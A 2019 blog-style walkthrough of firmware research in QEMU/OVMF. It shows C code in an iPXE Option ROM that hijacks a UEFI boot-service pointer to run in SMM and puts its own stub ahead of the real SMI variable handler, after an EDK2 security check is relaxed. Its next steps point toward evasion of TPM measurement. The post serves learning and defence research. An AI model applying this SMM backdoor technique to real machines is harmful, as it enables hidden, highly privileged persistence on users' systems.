---
title: "Using an Option ROM to overwrite SMM/SMI handlers in QEMU"
created: 2019-12-04
tags: 
  - uefi
  - firmware
---

This article explores PCI Expansion ROM (or Option ROM) execution within UEFI and walks through a practical scenario of using Option ROM code to modify SMM. In order to accomplish this goal we relax the security within EDK2. Note that this article does not reveal any security weaknesses.

We begin with how to create a QEMU/OVMF/iPXE testing environment that boots Fedora with UEFI Secure Boot enabled and measures the pre-OS environment using a software TPM2. We then install an SMI handler by modifying our iPXE EFI Option ROM, which is the same as a DXE driver run during Boot Device Select (BDS). Finally, we again modify our Option ROM code and overwrite and reliably 'shim' an existing SMI's handler with our own.

<!--more-->

A majority of the source material for this article can be found in the following links. They were a great source of personal learning and are well worth reading/refreshing:

- [Building reliable SMM backdoor for UEFI based platforms](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) by Dmytro Oleksiuk, for inspiration, development direction, and SMM/EDK2 design.
- [A Tour Beyond BIOS Secure SMM Communication in the EFI Developer Kit II](assets/A_Tour_Beyond_BIOS_Secure_SMM_Communication.pdf) byt Jiewen Yao et al, EDK2 SMM design.
- [Securing secure boot with System Management Mode](assets/kvmforum15-smm.pdf) by Paolo Bonzini, SMM/KVM/QEMU design.
- [Malicious Code Execution in PCI Expansion ROM](https://resources.infosecinstitute.com/pci-expansion-rom/#gref) by Darmawan Salihun, a summary of Option ROM details.
- [Open Virtual Machine Firmware (OVMF) Status Report](http://www.linux-kvm.org/downloads/lersek/ovmf-whitepaper-c770f8c.txt) by Laszlo Ersek, OVMF design.
- And of course, the materials/guides/docs linked throughout.

## Create a QEMU/OVMF testing environment

Assume we are building on a modern Linux host with normal build tooling available.

To reproduce my environment, use QEMU version 4.1.1.

```sh
$ git://git.qemu.org/qemu.git && cd qemu
$ git checkout v4.1.1
$ git submodule update --init
$ ./configure --target-list=x86_64-softmmu
[...]
TPM support       yes
[...]
```

It is optional to include a TPM in the testing VM, but it is nice to verify PCI Configuration data and Option ROM code is measured. I followed S3hh's article on [TPM 2.0 in QEMU](https://s3hh.wordpress.com/2018/06/03/tpm-2-0-in-qemu/) to build and install [`swtpm`](https://github.com/stefanberger/swtpm).

Next clone the EDK2 and build OVMF. This can be complicated, my recommendation is following the [build guides for EDK2](https://github.com/tianocore/tianocore.github.io/wiki/Getting-Started-with-EDK-II) then following the [OVMF build guide](https://github.com/tianocore/edk2/blob/master/OvmfPkg/README) and my steps here for OVMF.

```sh
$ git clone https://github.com/tianocore/edk2 && cd edk2
$ git checkout edk2-stable201908
$ git submodule update --init
$ make -C BaseTools
$ cat Conf/target.txt
[...]
ACTIVE_PLATFORM       = OvmfPkg/OvmfPkgX64.dsc
TARGET                = DEBUG
TARGET_ARCH           = IA32 X64
TOOL_CHAIN_CONF       = Conf/tools_def.txt
TOOL_CHAIN_TAG        = GCC5

$ . ./edksetup.sh BaseTools
```

We want to use SecureBoot, SMM, and a TPM2 within OVMF -- so it needs more setup. I followed the build steps from Fedora's `edk2-ovmf` [package spec](https://git.kraxel.org/cgit/jenkins/edk2/tree/edk2.git.spec.template).

```sh
$ wget https://git.kraxel.org/cgit/jenkins/edk2/plain/0001-EXCLUDE_SHELL_FROM_FD.patch
$ wget https://git.kraxel.org/cgit/jenkins/edk2/plain/0001-OvmfPkg-SmbiosPlatformDxe-install-legacy-QEMU-tables.patch
$ wget https://git.kraxel.org/cgit/jenkins/edk2/plain/0002-OvmfPkg-SmbiosPlatformDxe-install-patch-default-lega.patch
$ wget https://git.kraxel.org/cgit/jenkins/edk2/plain/0003-OvmfPkg-SmbiosPlatformDxe-install-patch-default-lega.patch
$ patch -l -p1 < 0001-EXCLUDE_SHELL_FROM_FD.patch
$ patch -l -p1 < 0001-OvmfPkg-SmbiosPlatformDxe-install-legacy-QEMU-tables.patch
$ patch -l -p1 < 0002-OvmfPkg-SmbiosPlatformDxe-install-patch-default-lega.patch
$ patch -l -p1 < 0003-OvmfPkg-SmbiosPlatformDxe-install-patch-default-lega.patch
$ OvmfPkg/build.sh \
    -a IA32 -a X64 \
    -D SMM_REQUIRE -D SECURE_BOOT_ENABLE \
    -D TPM2_ENABLE -D TPM2_CONFIG_ENABLE \
    -D FD_SIZE_2MB -D EXCLUDE_SHELL_FROM_FD
```

Then obtain the template UEFI variable-store with Secure Boot PK and other variables set to boot a signed Fedora install.

```sh
$ wget https://rpmfind.net/linux/fedora/linux/development/rawhide/Everything/armhfp/os/Packages/e/edk2-ovmf-20190501stable-4.fc32.noarch.rpm
$ rpm2cpio edk2-ovmf-20190501stable-4.fc32.noarch.rpm | cpio -idmv
[...]
./usr/share/OVMF/OVMF_VARS.secboot.fd
```

Build an example Option ROM using iPXE. We can build an Option ROM more simply, but iPXE has great build tooling and is a well-written codebase. We will build an EFI ROM, an Option ROM with 'Code Type' EFI, which is supported by EDK2. This builds an EFI driver then encapsulates it with the needed PCI Expansion ROM header and PCI Data Structure header. We use the Vendor/Model ID for an _Intel Corporation 82574L Gigabit Network Connection_, which is the `e1000e` default emulated QEMU NIC.

```sh
$ git clone git://git.ipxe.org/ipxe.git && cd ipxe/src
$ make bin-x86_64-efi/808610d3.efirom V=1
```

The final step is installing Fedora Server. I leave this exercise to the reader.

A resulting QEMU command to put these pieces together:

```sh
OROM=./ipxe/src/bin-x86_64-efi/808610d3.efirom
OVMF=./edk2/Build/Ovmf3264/DEBUG_GCC5/FV/OVMF_CODE.fd
VARS=./usr/share/OVMF/OVMF_VARS.secboot.fd

$ ./qemu/x86_64-softmmu/qemu-system-x86_64 \
    -machine q35,smm=on,accel=tcg \
    -m 1024 \
    -smp 4,sockets=1,cores=4,threads=1 \
    -nographic \
    -serial mon:stdio \
    -chardev pty,id=charserial1 \
    -device isa-serial,chardev=charserial1,id=serial1 \
    -netdev bridge,id=net0,br=$ \
    -device e1000e,netdev=net0,romfile=$OROM \
    -global driver=cfi.pflash01,property=secure,value=on \
    -drive file=$OVMF,if=pflash,format=raw,unit=0,readonly=on \
    -drive file=$VARS,if=pflash,format=raw,unit=1 \
    -chardev socket,id=chrtpm,path=$YOUR_TPM/tpmstate/swtpm-sock \
    -tpmdev emulator,id=tpm0,chardev=chrtpm \
    -device tpm-tis,tpmdev=tpm0 \
    -debugcon file:debug.log \
    -global isa-debugcon.iobase=0x402 \
    -hda $YOUR_DISK
```

Inspecting `dmesg` should show that Secure boot is enabled.

```sh
$ dmesg
[...]
[    0.000000] efi: EFI v2.70 by EDK II
[    0.000000] efi:  SMBIOS=0x3ebd2000  ACPI=0x3ebf9000  ACPI 2.0=0x3ebf9014  MEMATTR=0x3dcb6018
[    0.000000] secureboot: Secure boot enabled
[    0.000000] Kernel is locked down from EFI secure boot; see man kernel_lockdown.7
[    0.000000] SMBIOS 2.8 present.
```

And the TPM device:

```sh
$ dmesg
[...]
[    0.000000] tpm_tis 00:06: 1.2 TPM (device-id 0x1, rev-id 1)
[    0.000000] tpm tpm0: starting up the TPM manually
```

To inspect the PCR values we need to install `tpm2-tools`.

```sh
$ sudo rpm -i ./tpm2-tss-2.3.1-1.fc32.x86_64.rpm
$ sudo rpm -i ./tpm2-tools-3.2.0-3.fc31.x86_64.rpm
$ sudo tpm2_pcrlist
sha1 :
  0  : 475ea346af5cfc78c73f667e6342eb4936dced00 // Platform
  1  : 4a2ee913fdf51ff91eaab4b818007e6936141436 // Platform Config
  2  : 42516d0f53d87232b19d013880bc99d5c0f997b1 // Option ROM Code
  3  : b2a83b0ebf2f8374299a5b2bdfc31ea955ad7236 // Option ROM Config+Data
  4  : 5a7c6b901aa914083fa625f2e7a37860a79bf7dd // IPL Code
  5  : 696ac3602fd7f434d698180b2a02b15b8deadf4d // IPL Config+Datsa
  6  : b2a83b0ebf2f8374299a5b2bdfc31ea955ad7236
  7  : 4037336fa7bc0eabe3778fcfff5fcd0ee6adcde3
[...]
  9  : 0b3d418464da7ce0459dc9fc6d72447354a13e1e
[...]
```

We can boot several times and see the values are consistent. Later when we modify Option ROM code we can verify that only PCRs 2 and 3 change. This still allows us to boot since the measurements are only used as a log. If we implemented an attestation and included these PCRs we might fail.

Specifically, we'll be making changes to iPXE and the `romfile=` value for QEMU's configured `e1000e` device.

This testing environment allows for easy debugging with GDB. We can use [uefi-gdb](https://github.com/artem-nefedov/uefi-gdb) and add `-s -S` to the QEMU argument list to start QEMU in GDB, auto-add all the OVMF debug symbols, and persist our breakpoints between executions.

- Update the QEMU arguments to include `-s -S`, and remember to use `accel=tcg` instead of `accel=kvm`
- Start `gdb -ex 'source ./uefi-gdb/efi.py'` in the current-working-directory as QEMU's output `debug.log`
- Run `(gdb) efi -64` and make sure the OVMF debug symbols are loaded

Recommended symbols to break on include:

- `CoreLoadImageCommon`
- `SmiHandlerRegister`,
- `SmmIplReadyToLockEventNotify`
- `PciHostBridgeResourceAllocator`
- `ProcessOpRomImage`
- `Defer3rdPartyImageLoad`

Exploring the program state using these starting points helped me understand the end-to-end. I could hone in on what code was relevant and use that to dive deeper.

Within the OVMF platforms, UEFI Secure Boot does not verify Option ROM code due to `PcdOptionRomImageVerificationPolicy` set to `0x0`. This is the case for for OvmfPkgIa32, OvmfPkgX64, OvmfPkgIa32X64, and OvmfXen. If we wanted we could modify the EDKII code and set the value to `0x4` for OvmfPkgIa32X64 to prevent our custom Option ROM from loading.

## Modify OVMF to allow Option ROMs to execute code in SMM

An introduction to System Management Mode (SMM) is beyond the scope of this article. I highly recommend reading [Building reliable SMM backdoor for UEFI based platforms](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) by Dmytro Oleksiuk for an overview of SMM.

One thing that is relevant for us is knowing SMM/SMRAM is "locked" via `SmmIplReadyToLockEventNotify`. And images with deferred execution, like Option ROMs, are executed after this and the `EndOfDxe` event. This makes sense since Option ROM functionality should first be relevant during the Boot Device Selection (BDS) phase of UEFI's lifecycle.

Observe in the QEMU `debug.log`

```sh
[Security] 3rd party image[0] is deferred to load before EndOfDxe: PciRoot(0x0)/Pci(0x2,0x0)/Offset(0x0,0x377FF).
[...]
SMM IPL locked SMRAM window
[Security] 3rd party image[3DEC8D18] can be loaded after EndOfDxe: PciRoot(0x0)/Pci(0x2,0x0)/Offset(0x0,0x377FF).
[...]
```

Option ROMs are discovered within OVMF within `PciHostBridgeResourceAllocator`. You can find the relevant parsing and execution within [PciOptionRomSupport.c](https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Bus/Pci/PciBusDxe/PciOptionRomSupport.c), specifically `LoadOpRomImage`. The load image is attempted and subsequently deferred.

An image, for example a DXE Driver, is scheduled for deferred execution based on its device path. If the path does not belong to a Firmware Volume it is considered 3rd-party and deferred. This check happens within `Security2StubAuthenticate` as part of `FileFromFv` and introduced in October 2016 via [8be37a5cee700777ca8e8e8a34cc2225b21931a7](https://github.com/tianocore/edk2/commit/8be37a5cee700777ca8e8e8a34cc2225b21931a7).

For the purposes of this experiment we will remove this check and allow Option ROMs to load before the `EndOfDxe`. We are not trying to demonstrate weakness or new knowledge, only explore and learn.

## Install an SMM Interrupt (SMI) Handler

Lets focus on the iPXE codebase and `./src/interface/efi/efidrvprefix.c`. This contains our Option ROM entry point, the first code intentionally executed by OVMF.

```c
/**
 * EFI entry point
 *
 * @v image_handle	Image handle
 * @v systab		System table
 * @ret efirc		EFI return status code
 */
EFI_STATUS EFIAPI _efidrv_start ( EFI_HANDLE image_handle,
				  EFI_SYSTEM_TABLE *systab )
```

The first challenge is that this is executed 'outside' of SMM. And to my knowledge there is no configuration to request `CoreLoadImage` to execute an entry point within SMM like there is within the EDK using the `DXE_SMM_DRIVER` ModuleType.

The following represents the cleanest, easiest, and most reliable way to execute code from our Option ROM within SMM.

Within `MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c` we find that creating a `gEfiEventDxeDispatchGuid` event will cause SMM's dispatcher to scan for new images as well. We will not add to this list directly, but instead replace a pointer that the `SmmDriverDispatchHandler` will execute.

```sh
306- //
307- // Declare event notification on the DXE Dispatch Event Group.  This event is signaled by the DXE Core
308- // each time the DXE Core dispatcher has completed its work.  When this event is signalled, the SMM Core
309- // if notified, so the SMM Core can dispatch SMM drivers.
310- //
311:  { FALSE, TRUE,  &gEfiEventDxeDispatchGuid,          SmmIplDxeDispatchEventNotify,      &gEfiEventDxeDispatchGuid,          TPL_CALLBACK, NULL },
```

We'll add the following code to `_efidrv_start`, our entry point.

```c
gBS = systab->BootServices;

// Replace the LocateHandleBuffer pointer, called in SmmDriverDispatchHandler.
gLocateHandleBufferBackup = (VOID*)gBS->LocateHandleBuffer;
gBS->LocateHandleBuffer = (VOID*)HijackedLocateHandleBuffer;

// Indirectly trigger SmmDispatch, and thus calling our PxeLocateHandleBuffer method.
efirc = gBS->CreateEventEx(
  EVT_NOTIFY_SIGNAL,
  TPL_NOTIFY,
  EfiEventEmptyFunction,
  NULL,
  &gEfiEventDxeDispatchGuid,
  &DxeDispatchEvent
);
```

Our trampoline `HijackedLocateHandleBuffer` can be simple.

```c
EFI_STATUS
EFIAPI
HijackedLocateHandleBuffer (
  IN EFI_LOCATE_SEARCH_TYPE   SearchType,
  IN EFI_GUID                 *Protocol   OPTIONAL,
  IN VOID                     *SearchKey  OPTIONAL,
  IN OUT UINTN                *BufferSize,
  OUT EFI_HANDLE              *Buffer
  )
{
  EFI_HANDLE *HandleBuffer;

  // Remove the trampoline.
  if (gLocateHandleBufferBackup != NULL) {
    gBS->LocateHandleBuffer = (VOID*)gLocateHandleBufferBackup;
    gLocateHandleBufferBackup = NULL;
  }

  // Call the actual LocateHandleBuffer (not really needed).
  gBS->LocateHandleBuffer(
    SearchType,
    Protocol,
    SearchKey,
    BufferSize,
    &HandleBuffer
  );
  *BufferSize = 0;

  // We should be running in SMM now.
  OptionROMSmmEntryPoint();

  return Status;
}
```

During testing there was only ever one callback into the `HijackedLocateHandleBuffer`. The next step is to add sanity checks to make sure we are executing within SMM. If we are not then accessing anything within SMRAM, even at this stage before `EndOfDxe` will cause a fault.

```c
VOID
OptionROMSmmEntryPoint()
{
  EFI_STATUS Status;
  BOOLEAN InSmm = FALSE;
  EFI_SMM_BASE2_PROTOCOL *InternalSmmBase2 = NULL;

  // Resolve EFI_SMM_BASE2_PROTOCOL, which works inside/outside of SMM.
  Status = gBS->LocateProtocol(
    &gEfiSmmBase2ProtocolGuid,
    NULL,
    (VOID **)&InternalSmmBase2
  );

  if (EFI_ERROR(Status) || InternalSmmBase2 == NULL) {
    // Unlikely.
    return;
  }

  // Convenient helper to check if code is running within SMRAM.
  Status = InternalSmmBase2->InSmm(InternalSmmBase2, &InSmm);
  if (EFI_ERROR(Status) || !InSmm) {
    // Unlikely.
    return;
  }

  // This will fail outside of SMM.
  Status = InternalSmmBase2->GetSmstLocation(InternalSmmBase2, &gSmst);
  if (EFI_ERROR(Status) || gSmst == NULL) 
    // Unlikely.
    return;
  }

  // Do more work here.
}
```

The next part of testing focuses on persisting code within SMM. One goal I had was to reliably trigger/execute code during OS execution without being root.

## Overwrite EfiSMMVariableProtocol SMI

Our target is the `EfiSMMVariableProtocol` handler. This can be triggered by an unprivileged process `open`ing an `efivars` sysfs node.

Create an example stub that we can later fill in (outside the scope of this article) with our payload code.

```c
EFI_STATUS
EFIAPI
HijackedVariableHandler(
  IN     EFI_HANDLE                   DispatchHandle,
  IN     CONST VOID                   *RegisterContext,
  IN OUT VOID                         *CommBuffer,
  IN OUT UINTN                        *CommBufferSize
  )
{
  // Add your code here.

  // Return interrupt source pending to 'fall-through'.
  return EFI_WARN_INTERRUPT_SOURCE_PENDING;
}
```

Within `OptionROMSmmEntryPoint` lets install our handler.

The tricky part here is our handler will not replace the existing SMI handler but rather add to a list of handlers. When an SMI is triggered a list of handler methods is executed in the order they were installed, and only under certain conditions (their return code) a secondary or tertiary handler is attempted. We cannot cause the existing `EfiSMMVariableProtocol` handler to fail so we must uninstall and reinstall.

The final minor complication is our code right now is located outside of SMM. When SMM is locked, if it attempts to execute outside of SMRAM, a fault will occur. From a security/safety perspective this is ideal since we want to protect SMM's execution.

```c
  EFI_HANDLE Handle;
  VOID* handler;

  // We need to move our code into SMM.
  gSmst->SmmAllocatePool(EfiRuntimeServicesCode, 0x1000, &handler);
  gBS->CopyMem((void*)handler, HijackedVariableHandler, 0x1000);

  EFI_SMM_HANDLER_ENTRY_POINT2 HijackedVariableHandlerInSMM =
    (EFI_SMM_HANDLER_ENTRY_POINT2)handler;

  // Install our handler as secondary.
  Status = gSmst->SmiHandlerRegister(
    HijackedVariableHandlerInSMM,
    &gEfiSmmVariableProtocolGuid,
    &Handle
  );
  if (EFI_ERROR(Status)) {
    // Should free too.
    return;
  }

  SMI_HANDLER *SmiHandler = (SMI_HANDLER *)Handle;
  LIST_ENTRY *List = &SmiHandler->SmiEntry->SmiHandlers;
  LIST_ENTRY *Link = List->ForwardLink;

  // The 'real' or existing SMI handler.
  SMI_HANDLER *ExistingHandler = (SMI_HANDLER*)Link;
  EFI_SMM_HANDLER_ENTRY_POINT2 ExistingEntry =
    ExistingHandler->Handler;

  // Uninstall the primary handler.
  gSmst->SmiHandlerUnRegister((EFI_HANDLE)(ExistingHandler));

  // "Reinstall" the primary as the secondary.
  gSmst->SmiHandlerRegister(
    ExistingEntry,
    &gEfiSmmVariableProtocolGuid,
    &Handle
  );

  // Now our handler is primary.
```

If we add console logging to `HijackedVariableHandler` we can verify it is run often and can be triggered with the following:

```sh
$ cat /sys/firmware/efi/efivars/Lang-8be4df61-93ca-11d2-aa0d-00e098032b8c
```

And it is cool to see the only change to PCR measurements (as expected) are the Option ROM-relevant PCRs:

```sh
$ sudo tpm2_pcrlist
sha1 :
  0  : 475ea346af5cfc78c73f667e6342eb4936dced00 // Platform
  1  : 4a2ee913fdf51ff91eaab4b818007e6936141436 // Platform Config
  2* : f4a4943f9a6fbe351fe0d96b0894843bcea7fa83 // (changed!) Option ROM Code
  3  : b2a83b0ebf2f8374299a5b2bdfc31ea955ad7236 // Option ROM Config+Data
  4  : 5a7c6b901aa914083fa625f2e7a37860a79bf7dd // IPL Code
  5  : 696ac3602fd7f434d698180b2a02b15b8deadf4d // IPL Config+Datsa
  6  : b2a83b0ebf2f8374299a5b2bdfc31ea955ad7236
  7  : 4037336fa7bc0eabe3778fcfff5fcd0ee6adcde3
[...]
  9  : 0b3d418464da7ce0459dc9fc6d72447354a13e1e
[...]
```

Thanks for following along. I would appreciate any feedback and opportunity to improve the article.

## Next steps

The following are high-level 'next steps' to consider.

- Investigate achieving the same results, modifying SMM using Option ROMs, without relaxing security. This means finding a way to bypass deferred execution.
- Investigate how Option ROM loading and execution is different with CSM enabled.
- Use an Option ROM to persist and run code in other ways. The goal would be to functionally tamper the OS execution state without affecting PCR measurements beyond the expected PCR 2 and PCR 3.
- Analyze and study more Option ROM code and use-cases.
- Ideas?
